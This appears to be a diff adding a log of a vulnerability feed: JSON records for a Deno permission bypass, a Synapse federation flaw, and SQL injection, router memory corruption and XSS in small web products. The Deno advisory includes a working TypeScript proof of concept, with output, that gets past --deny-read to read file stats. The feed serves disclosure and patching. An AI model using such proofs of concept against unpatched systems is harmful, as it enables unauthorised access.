@@ -1,0 +1,774 @@
+[Wed Oct  8 18:33:54 UTC 2025] Latest CVEs:
+[
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-qq26-84mh-26j9",
+    "modified": "2025-10-08T17:56:40Z",
+    "published": "2025-10-08T17:56:40Z",
+    "aliases": [
+      "CVE-2025-61786"
+    ],
+    "summary": "Deno's --deny-read check does not prevent permission bypass",
+    "details": "### Summary \n\n`Deno.FsFile.prototype.stat` and `Deno.FsFile.prototype.statSync` are not limited by the permission model check `--deny-read=./`.\n\nIt's possible to retrieve stats from files that the user do not have explicit read access to  (the script is executed with `--deny-read=./`)\n\nSimilar APIs like `Deno.stat` and `Deno.statSync` require `allow-read` permission, however, when a file is opened, even with file-write only flags and deny-read permission, it's still possible to retrieve file stats, and thus bypass the permission model.\n\n### PoC\n\nSetup:\n```\ndeno --version\ndeno 2.4.2 (stable, release, x86_64-unknown-linux-gnu)\nv8 13.7.152.14-rusty\ntypescript 5.8.3\n\ntouch test1.txt\n```\n\n- `poc_file.stat.ts`\n```ts\n// touch test1.txt\n// https://docs.deno.com/api/deno/~/Deno.FsFile.prototype.stat\n// deno run --deny-read=./ --allow-write=./ poc_file.stat.ts 1\n// deno run --allow-write=./ poc_file.stat.ts 1\nasync function poc1(){\n    using file = await Deno.open(\"./test1.txt\", { read: false, write: true});\n    const fileInfo = await file.stat();\n    console.log(fileInfo.isFile);\n}\n\n// https://docs.deno.com/api/deno/~/Deno.FsFile.prototype.statSync\n// deno run --deny-read=./ --allow-write=./ poc_file.stat.ts 2\n// deno run --allow-write=./ poc_file.stat.ts 2\nfunction poc2(){\n    using file = Deno.openSync(\"./test1.txt\", { read: false, write: true});\n    const fileInfo = file.statSync();\n    console.log(fileInfo.isFile);\n}\n\n// https://docs.deno.com/api/deno/~/Deno.stat\n// deno run --deny-read=./ --allow-write=./ poc_file.stat.ts 3\n// deno run --allow-write=./ poc_file.stat.ts 3\nasync function poc3(){\n    // not executed\n    const fileInfo = await Deno.stat(\"./test1.txt\");\n    console.log(fileInfo.isFile);\n}\n\n// https://docs.deno.com/api/deno/~/Deno.statSync\n// deno run --deny-read=./ --allow-write=./ poc_file.stat.ts 4\n// deno run --allow-write=./ poc_file.stat.ts 4\nfunction poc4(){\n    // not executed\n    const fileInfo = Deno.statSync(\"./test1.txt\");\n    console.log(fileInfo.isFile);\n}\n\n\nasync function main(){\n    const poc = Deno.args[0] || 1;\n\n    const status = await Deno.permissions.query({ name: \"read\", path: \"./\" });\n    console.log(status);\n    switch (poc) {\n        case \"1\":\n            poc1()\n            break;\n        case \"2\":\n            poc2()\n            break;\n        case \"3\":\n            poc3()\n            break;\n        case \"4\":\n            poc4()\n            break;\n        default:\n            poc1()\n    }\n}\n\nmain()\n```\n\n\nOutput:\n- `deno run --deny-read=./ --allow-write=./ poc_file.stat.ts 1`\n```\nPermissionStatus { state: \"denied\", onchange: null }\ntrue\n```\n\n- `deno run --deny-read=./ --allow-write=./ poc_file.stat.ts 2`\n```\nPermissionStatus { state: \"denied\", onchange: null }\ntrue\n```\n\n- `deno run --deny-read=./ --allow-write=./ poc_file.stat.ts 3`\n```\nPermissionStatus { state: \"denied\", onchange: null }\nerror: Uncaught (in promise) NotCapable: Requires read access to \"./test1.txt\", run again with the --allow-read flag\n    const fileInfo = await Deno.stat(\"./test1.txt\");\n                                ^\n    ...\n```\n\n- `deno run --deny-read=./ --allow-write=./ poc_file.stat.ts 4`\n```\nPermissionStatus { state: \"denied\", onchange: null }\nerror: Uncaught (in promise) NotCapable: Requires read access to \"./test1.txt\", run again with the --allow-read flag\n    const fileInfo = Deno.statSync(\"./test1.txt\");\n                          ^\n    ...\n```\n\n\n### Impact\n\nPermission model bypass",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "crates.io",
+          "name": "deno"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.5.3"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/denoland/deno/security/advisories/GHSA-qq26-84mh-26j9"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-61786"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/denoland/deno/pull/30876"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/denoland/deno/commit/1ab2268c0bcbf9b0468e0e36963f77f8c31c73ec"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/denoland/deno"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/denoland/deno/releases/tag/v2.2.15"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/denoland/deno/releases/tag/v2.5.3"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-269"
+      ],
+      "severity": "LOW",
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-10-08T17:56:40Z",
+      "nvd_published_at": "2025-10-08T01:15:33Z"
+    }
+  },
+  {
+    "dataType": "CVE_RECORD",
+    "dataVersion": "5.1",
+    "cveMetadata": {
+      "cveId": "CVE-2025-11422",
+      "assignerOrgId": "1af790b2-7ee1-4545-860a-a788eba489b5",
+      "state": "PUBLISHED",
+      "assignerShortName": "VulDB",
+      "dateReserved": "2025-10-07T11:34:55.718Z",
+      "datePublished": "2025-10-08T01:32:06.033Z",
+      "dateUpdated": "2025-10-08T17:54:54.803Z"
+    },
+    "containers": {
+      "cna": {
+        "providerMetadata": {
+          "orgId": "1af790b2-7ee1-4545-860a-a788eba489b5",
+          "shortName": "VulDB",
+          "dateUpdated": "2025-10-08T01:32:06.033Z"
+        },
+        "title": "Campcodes Advanced Online Voting Management System login.php sql injection",
+        "problemTypes": [
+          {
+            "descriptions": [
+              {
+                "type": "CWE",
+                "cweId": "CWE-89",
+                "lang": "en",
+                "description": "SQL Injection"
+              }
+            ]
+          },
+          {
+            "descriptions": [
+              {
+                "type": "CWE",
+                "cweId": "CWE-74",
+                "lang": "en",
+                "description": "Injection"
+              }
+            ]
+          }
+        ],
+        "affected": [
+          {
+            "vendor": "Campcodes",
+            "product": "Advanced Online Voting Management System",
+            "versions": [
+              {
+                "version": "1.0",
+                "status": "affected"
+              }
+            ]
+          }
+        ],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "A vulnerability has been found in Campcodes Advanced Online Voting Management System 1.0. The impacted element is an unknown function of the file /admin/login.php. Such manipulation of the argument Username leads to sql injection. The attack can be executed remotely. The exploit has been disclosed to the public and may be used."
+          },
+          {
+            "lang": "de",
+            "value": "Es wurde eine Schwachstelle in Campcodes Advanced Online Voting Management System 1.0 entdeckt. Betroffen hiervon ist ein unbekannter Ablauf der Datei /admin/login.php. Durch das Beeinflussen des Arguments Username mit unbekannten Daten kann eine sql injection-Schwachstelle ausgenutzt werden. Der Angriff kann remote ausgeführt werden. Die Schwachstelle wurde öffentlich offengelegt und könnte ausgenutzt werden."
+          }
+        ],
+        "metrics": [
+          {
+            "cvssV4_0": {
+              "version": "4.0",
+              "baseScore": 6.9,
+              "vectorString": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P",
+              "baseSeverity": "MEDIUM"
+            }
+          },
+          {
+            "cvssV3_1": {
+              "version": "3.1",
+              "baseScore": 7.3,
+              "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:X/RC:R",
+              "baseSeverity": "HIGH"
+            }
+          },
+          {
+            "cvssV3_0": {
+              "version": "3.0",
+              "baseScore": 7.3,
+              "vectorString": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:X/RC:R",
+              "baseSeverity": "HIGH"
+            }
+          },
+          {
+            "cvssV2_0": {
+              "version": "2.0",
+              "baseScore": 7.5,
+              "vectorString": "AV:N/AC:L/Au:N/C:P/I:P/A:P/E:POC/RL:ND/RC:UR"
+            }
+          }
+        ],
+        "timeline": [
+          {
+            "time": "2025-10-07T00:00:00.000Z",
+            "lang": "en",
+            "value": "Advisory disclosed"
+          },
+          {
+            "time": "2025-10-07T02:00:00.000Z",
+            "lang": "en",
+            "value": "VulDB entry created"
+          },
+          {
+            "time": "2025-10-07T13:39:59.000Z",
+            "lang": "en",
+            "value": "VulDB entry last update"
+          }
+        ],
+        "credits": [
+          {
+            "lang": "en",
+            "value": "hbesljx (VulDB User)",
+            "type": "reporter"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://vuldb.com/?id.327357",
+            "name": "VDB-327357 | Campcodes Advanced Online Voting Management System login.php sql injection",
+            "tags": [
+              "vdb-entry",
+              "technical-description"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?ctiid.327357",
+            "name": "VDB-327357 | CTI Indicators (IOB, IOC, TTP, IOA)",
+            "tags": [
+              "signature",
+              "permissions-required"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?submit.665949",
+            "name": "Submit #665949 | Campcodes Advanced Online Voting Management System 9/26,2024 SQL Injection",
+            "tags": [
+              "third-party-advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/hbesljx/vul/issues/5",
+            "tags": [
+              "exploit",
+              "issue-tracking"
+            ]
+          },
+          {
+            "url": "https://www.campcodes.com/",
+            "tags": [
+              "product"
+            ]
+          }
+        ],
+        "tags": [
+          "x_freeware"
+        ]
+      },
+      "adp": [
+        {
+          "metrics": [
+            {
+              "other": {
+                "type": "ssvc",
+                "content": {
+                  "timestamp": "2025-10-08T17:54:44.298104Z",
+                  "id": "CVE-2025-11422",
+                  "options": [
+                    {
+                      "Exploitation": "poc"
+                    },
+                    {
+                      "Automatable": "yes"
+                    },
+                    {
+                      "Technical Impact": "partial"
+                    }
+                  ],
+                  "role": "CISA Coordinator",
+                  "version": "2.0.3"
+                }
+              }
+            }
+          ],
+          "title": "CISA ADP Vulnrichment",
+          "providerMetadata": {
+            "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+            "shortName": "CISA-ADP",
+            "dateUpdated": "2025-10-08T17:54:54.803Z"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "dataType": "CVE_RECORD",
+    "dataVersion": "5.1",
+    "cveMetadata": {
+      "cveId": "CVE-2025-11423",
+      "assignerOrgId": "1af790b2-7ee1-4545-860a-a788eba489b5",
+      "state": "PUBLISHED",
+      "assignerShortName": "VulDB",
+      "dateReserved": "2025-10-07T11:36:14.163Z",
+      "datePublished": "2025-10-08T02:02:06.119Z",
+      "dateUpdated": "2025-10-08T17:51:58.502Z"
+    },
+    "containers": {
+      "cna": {
+        "providerMetadata": {
+          "orgId": "1af790b2-7ee1-4545-860a-a788eba489b5",
+          "shortName": "VulDB",
+          "dateUpdated": "2025-10-08T02:02:06.119Z"
+        },
+        "title": "Tenda CH22 SafeEmailFilter formSafeEmailFilter memory corruption",
+        "problemTypes": [
+          {
+            "descriptions": [
+              {
+                "type": "CWE",
+                "cweId": "CWE-119",
+                "lang": "en",
+                "description": "Memory Corruption"
+              }
+            ]
+          }
+        ],
+        "affected": [
+          {
+            "vendor": "Tenda",
+            "product": "CH22",
+            "versions": [
+              {
+                "version": "1.0.0.1",
+                "status": "affected"
+              }
+            ]
+          }
+        ],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "A vulnerability was found in Tenda CH22 1.0.0.1. This affects the function formSafeEmailFilter of the file /goform/SafeEmailFilter. Performing manipulation of the argument page results in memory corruption. The attack is possible to be carried out remotely. The exploit has been made public and could be used."
+          },
+          {
+            "lang": "de",
+            "value": "In Tenda CH22 1.0.0.1 wurde eine Schwachstelle gefunden. Es geht um die Funktion formSafeEmailFilter der Datei /goform/SafeEmailFilter. Durch Beeinflussen des Arguments page mit unbekannten Daten kann eine memory corruption-Schwachstelle ausgenutzt werden. Der Angriff kann über das Netzwerk angegangen werden. Der Exploit ist öffentlich verfügbar und könnte genutzt werden."
+          }
+        ],
+        "metrics": [
+          {
+            "cvssV4_0": {
+              "version": "4.0",
+              "baseScore": 9.3,
+              "vectorString": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+              "baseSeverity": "CRITICAL"
+            }
+          },
+          {
+            "cvssV3_1": {
+              "version": "3.1",
+              "baseScore": 9.8,
+              "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:X/RC:R",
+              "baseSeverity": "CRITICAL"
+            }
+          },
+          {
+            "cvssV3_0": {
+              "version": "3.0",
+              "baseScore": 9.8,
+              "vectorString": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:X/RC:R",
+              "baseSeverity": "CRITICAL"
+            }
+          },
+          {
+            "cvssV2_0": {
+              "version": "2.0",
+              "baseScore": 10,
+              "vectorString": "AV:N/AC:L/Au:N/C:C/I:C/A:C/E:POC/RL:ND/RC:UR"
+            }
+          }
+        ],
+        "timeline": [
+          {
+            "time": "2025-10-07T00:00:00.000Z",
+            "lang": "en",
+            "value": "Advisory disclosed"
+          },
+          {
+            "time": "2025-10-07T02:00:00.000Z",
+            "lang": "en",
+            "value": "VulDB entry created"
+          },
+          {
+            "time": "2025-10-07T13:41:17.000Z",
+            "lang": "en",
+            "value": "VulDB entry last update"
+          }
+        ],
+        "credits": [
+          {
+            "lang": "en",
+            "value": "Li Hu (VulDB User)",
+            "type": "reporter"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://vuldb.com/?id.327358",
+            "name": "VDB-327358 | Tenda CH22 SafeEmailFilter formSafeEmailFilter memory corruption",
+            "tags": [
+              "vdb-entry",
+              "technical-description"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?ctiid.327358",
+            "name": "VDB-327358 | CTI Indicators (IOB, IOC, IOA)",
+            "tags": [
+              "signature",
+              "permissions-required"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?submit.666009",
+            "name": "Submit #666009 | Tenda Shenzhen Jixiang Tengda Technology Co., Ltd. Router CH22 V1.0.0.1 Tenda V1.0.0.1 Buffer Overflow",
+            "tags": [
+              "third-party-advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/f000x0/cve/issues/7",
+            "tags": [
+              "exploit",
+              "issue-tracking"
+            ]
+          },
+          {
+            "url": "https://www.tenda.com.cn/",
+            "tags": [
+              "product"
+            ]
+          }
+        ]
+      },
+      "adp": [
+        {
+          "metrics": [
+            {
+              "other": {
+                "type": "ssvc",
+                "content": {
+                  "timestamp": "2025-10-08T17:51:34.017646Z",
+                  "id": "CVE-2025-11423",
+                  "options": [
+                    {
+                      "Exploitation": "poc"
+                    },
+                    {
+                      "Automatable": "yes"
+                    },
+                    {
+                      "Technical Impact": "total"
+                    }
+                  ],
+                  "role": "CISA Coordinator",
+                  "version": "2.0.3"
+                }
+              }
+            }
+          ],
+          "title": "CISA ADP Vulnrichment",
+          "providerMetadata": {
+            "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+            "shortName": "CISA-ADP",
+            "dateUpdated": "2025-10-08T17:51:58.502Z"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-fh66-fcv5-jjfr",
+    "modified": "2025-10-08T17:51:02Z",
+    "published": "2025-10-08T17:51:02Z",
+    "aliases": [
+      "CVE-2025-61672"
+    ],
+    "summary": "Synapse's invalid device keys degrade federation functionality",
+    "details": "### Impact\n\nLack of validation for device keys in Synapse before 1.138.3 and in Synapse 1.139.0 allow an attacker registered on the victim homeserver to degrade federation functionality, unpredictably breaking outbound federation to other homeservers. \n\n### Patches\n\nPatched in Synapse 1.138.3, 1.138.4, 1.139.1, and 1.139.2.\n\nNote that even though 1.138.3 and 1.139.1 fix the vulnerability, they inadvertently introduced an unrelated regression. For this reason, it is recommend to skip these releases and upgrading straight to 1.138.4 and 1.139.2.\n\n### Workarounds\n\nThe vulnerability can only be exploited by users registered on the victim homeserver.",
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "PyPI",
+          "name": "matrix-synapse"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "1.138.3"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "PyPI",
+          "name": "matrix-synapse"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.139.0rc2"
+              },
+              {
+                "fixed": "1.139.1"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/element-hq/synapse/security/advisories/GHSA-fh66-fcv5-jjfr"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-61672"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/element-hq/synapse/pull/17097"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/element-hq/synapse/commit/26aaaf9e48fff80cf67a20c691c75d670034b3c1"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/element-hq/synapse/commit/7069636c2d6d1ef2022287addf3ed8b919ef2740"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/element-hq/synapse"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/element-hq/synapse/releases/tag/v1.138.3"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/element-hq/synapse/releases/tag/v1.138.4"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/element-hq/synapse/releases/tag/v1.139.1"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/element-hq/synapse/releases/tag/v1.139.2"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-1287"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-10-08T17:51:02Z",
+      "nvd_published_at": "2025-10-08T15:16:25Z"
+    }
+  },
+  {
+    "dataType": "CVE_RECORD",
+    "dataVersion": "5.1",
+    "cveMetadata": {
+      "cveId": "CVE-2025-11433",
+      "assignerOrgId": "1af790b2-7ee1-4545-860a-a788eba489b5",
+      "state": "PUBLISHED",
+      "assignerShortName": "VulDB",
+      "dateReserved": "2025-10-07T13:00:55.893Z",
+      "datePublished": "2025-10-08T05:02:05.738Z",
+      "dateUpdated": "2025-10-08T17:47:43.415Z"
+    },
+    "containers": {
+      "cna": {
+        "providerMetadata": {
+          "orgId": "1af790b2-7ee1-4545-860a-a788eba489b5",
+          "shortName": "VulDB",
+          "dateUpdated": "2025-10-08T05:02:05.738Z"
+        },
+        "title": "itsourcecode Leave Management System Query Parameter controller.php redirect cross site scripting",
+        "problemTypes": [
+          {
+            "descriptions": [
+              {
+                "type": "CWE",
+                "cweId": "CWE-79",
+                "lang": "en",
+                "description": "Cross Site Scripting"
+              }
+            ]
+          },
+          {
+            "descriptions": [
+              {
+                "type": "CWE",
+                "cweId": "CWE-94",
+                "lang": "en",
+                "description": "Code Injection"
+              }
+            ]
+          }
+        ],
+        "affected": [
+          {
+            "vendor": "itsourcecode",
+            "product": "Leave Management System",
+            "versions": [
+              {
+                "version": "1.0",
+                "status": "affected"
+              }
+            ],
+            "modules": [
+              "Query Parameter Handler"
+            ]
+          }
+        ],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "A security flaw has been discovered in itsourcecode Leave Management System 1.0. This impacts the function redirect of the file /module/employee/controller.php?action=reset of the component Query Parameter Handler. Performing manipulation of the argument ID results in cross site scripting. It is possible to initiate the attack remotely. The exploit has been released to the public and may be exploited."
+          },
+          {
+            "lang": "de",
+            "value": "In itsourcecode Leave Management System 1.0 wurde eine Schwachstelle gefunden. Hierbei betrifft es die Funktion redirect der Datei /module/employee/controller.php?action=reset der Komponente Query Parameter Handler. Durch Manipulieren des Arguments ID mit unbekannten Daten kann eine cross site scripting-Schwachstelle ausgenutzt werden. Der Angriff lässt sich über das Netzwerk starten. Der Exploit steht zur öffentlichen Verfügung."
+          }
+        ],
+        "metrics": [
+          {
+            "cvssV4_0": {
+              "version": "4.0",
+              "baseScore": 5.1,
+              "vectorString": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+              "baseSeverity": "MEDIUM"
+            }
+          },
+          {
+            "cvssV3_1": {
+              "version": "3.1",
+              "baseScore": 3.5,
+              "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N/E:P/RL:X/RC:R",
+              "baseSeverity": "LOW"
+            }
+          },
+          {
+            "cvssV3_0": {
+              "version": "3.0",
+              "baseScore": 3.5,
+              "vectorString": "CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N/E:P/RL:X/RC:R",
+              "baseSeverity": "LOW"
+            }
+          },
+          {
+            "cvssV2_0": {
+              "version": "2.0",
+              "baseScore": 4,
+              "vectorString": "AV:N/AC:L/Au:S/C:N/I:P/A:N/E:POC/RL:ND/RC:UR"
+            }
+          }
+        ],
+        "timeline": [
+          {
+            "time": "2025-10-07T00:00:00.000Z",
+            "lang": "en",
+            "value": "Advisory disclosed"
+          },
+          {
+            "time": "2025-10-07T02:00:00.000Z",
+            "lang": "en",
+            "value": "VulDB entry created"
+          },
+          {
+            "time": "2025-10-07T15:06:06.000Z",
+            "lang": "en",
+            "value": "VulDB entry last update"
+          }
+        ],
+        "credits": [
+          {
+            "lang": "en",
+            "value": "px_kanten (VulDB User)",
+            "type": "reporter"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://vuldb.com/?id.327370",
+            "name": "VDB-327370 | itsourcecode Leave Management System Query Parameter controller.php redirect cross site scripting",
+            "tags": [
+              "vdb-entry",
+              "technical-description"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?ctiid.327370",
+            "name": "VDB-327370 | CTI Indicators (IOB, IOC, TTP, IOA)",
+            "tags": [
+              "signature",
+              "permissions-required"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?submit.666541",
+            "name": "Submit #666541 | itsourcecode Leave Management System in PHP v1 reflected XSS",
+            "tags": [
+              "third-party-advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/romatdibrohiksnov/vulndb.com/blob/main/itsourcecode%20Leave%20Management%20System%20%E2%80%94%20Reflected%20Cross-Site%20Scripting%20(XSS)/readme.md",
+            "tags": [
+              "exploit"
+            ]
+          },
+          {
+            "url": "https://itsourcecode.com/",
+            "tags": [
+              "product"
+            ]
+          }
+        ],
+        "tags": [
+          "x_freeware"
+        ]
+      },
+      "adp": [
+        {
+          "metrics": [
+            {
+              "other": {
+                "type": "ssvc",
+                "content": {
+                  "timestamp": "2025-10-08T17:44:43.233539Z",
+                  "id": "CVE-2025-11433",
+                  "options": [
+                    {
+                      "Exploitation": "poc"
+                    },
+                    {
+                      "Automatable": "no"
+                    },
+                    {
+                      "Technical Impact": "partial"
+                    }
+                  ],
+                  "role": "CISA Coordinator",
+                  "version": "2.0.3"
+                }
+              }
+            }
+          ],
+          "title": "CISA ADP Vulnrichment",
+          "providerMetadata": {
+            "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+            "shortName": "CISA-ADP",
+            "dateUpdated": "2025-10-08T17:47:43.415Z"
+          }
+        }
+      ]
+    }
+  }
+]
